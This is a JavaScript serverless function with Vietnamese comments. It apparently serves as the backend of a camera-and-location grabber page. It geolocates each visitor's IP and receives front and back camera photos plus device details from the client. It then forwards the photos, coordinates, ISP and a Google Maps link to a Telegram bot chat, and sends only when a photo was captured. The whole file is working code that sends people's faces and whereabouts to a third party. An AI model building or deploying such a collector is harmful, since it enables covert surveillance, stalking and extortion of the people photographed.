// api/tele-proxy.js
export const config = { runtime: "edge" };

export default async function handler(req) {
  const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (req.method !== "POST")
    return new Response("Method Not Allowed", { status: 405 });

  try {
    // 1. LẤY THÔNG TIN IP & ĐỊA CHỈ TỪ SERVER
    const userIP =
      req.headers.get("x-forwarded-for")?.split(",")[0] || "Unknown";
    const geoRes = await fetch(`https://freeipapi.com/api/json/${userIP}`);
    const geo = await geoRes.json();

    const lat = geo.latitude || "0";
    const lon = geo.longitude || "0";
    const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;

    // 2. NHẬN DỮ LIỆU TỪ CLIENT
    const contentType = req.headers.get("content-type") || "";
    let clientData = {};
    let formData = null;

    if (contentType.includes("multipart/form-data")) {
      formData = await req.formData();
      clientData = JSON.parse(formData.get("clientInfo") || "{}");
    } else {
      clientData = await req.json();
    }

    // 3. KIỂM TRA ĐIỀU KIỆN ẢNH (BẮT BUỘC PHẢI CÓ ẢNH MỚI GỬI)
    const hasFront = formData && formData.has("front");
    const hasBack = formData && formData.has("back");

    // Nếu KHÔNG có cả ảnh trước lẫn ảnh sau -> Bỏ qua, không gửi gì lên Telegram
    if (!hasFront && !hasBack) {
      return new Response(
        JSON.stringify({
          success: false,
          message: "No photo captured, skipped sending.",
        }),
        {
          status: 200,
          headers: { "Content-Type": "application/json" },
        },
      );
    }

    // 4. TẠO CAPTION KHI CÓ ẢNH
    const finalCaption = `
📡 [THÔNG TIN TRUY CẬP & ẢNH XÁC THỰC]

🕒 Thời gian: ${clientData.time || new Date().toLocaleString("vi-VN")}
📱 Thiết bị: ${clientData.device || "Unknown"}
🖥️ Hệ điều hành: ${clientData.os || "Unknown"}
🌍 IP dân cư: ${userIP}
🏢 ISP: ${geo.asName || "VNNIC"}
🏙️ Địa chỉ: ${address}
🌎 Quốc gia: ${geo.countryName || "Việt Nam"}
📍 Vĩ độ: ${lat}
📍 Kinh độ: ${lon}
📌 Google Maps: http://googleusercontent.com/maps.google.com/${lat},${lon}
📸 Camera: ${clientData.camera || "✅ Đã chụp thành công"}

⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
`.trim();

    // 5. GỬI ĐẾN TELEGRAM (Gửi Album ảnh kèm caption)
    const teleForm = new FormData();
    teleForm.append("chat_id", CHAT_ID);

    const media = [];

    if (hasFront) {
      media.push({
        type: "photo",
        media: "attach://front",
        caption: finalCaption,
      });
      teleForm.append("front", formData.get("front"));
    }

    if (hasBack) {
      // Nếu có ảnh trước rồi thì ảnh sau không cần gắn lại caption nữa
      media.push({
        type: "photo",
        media: "attach://back",
        caption: !hasFront ? finalCaption : undefined,
      });
      teleForm.append("back", formData.get("back"));
    }

    teleForm.append("media", JSON.stringify(media));

    const res = await fetch(
      `https://api.telegram.org/bot${TOKEN}/sendMediaGroup`,
      {
        method: "POST",
        body: teleForm,
      },
    );

    return new Response(await res.text(), { status: 200 });
  } catch (err) {
    return new Response(JSON.stringify({ error: err.message }), {
      status: 500,
    });
  }
}
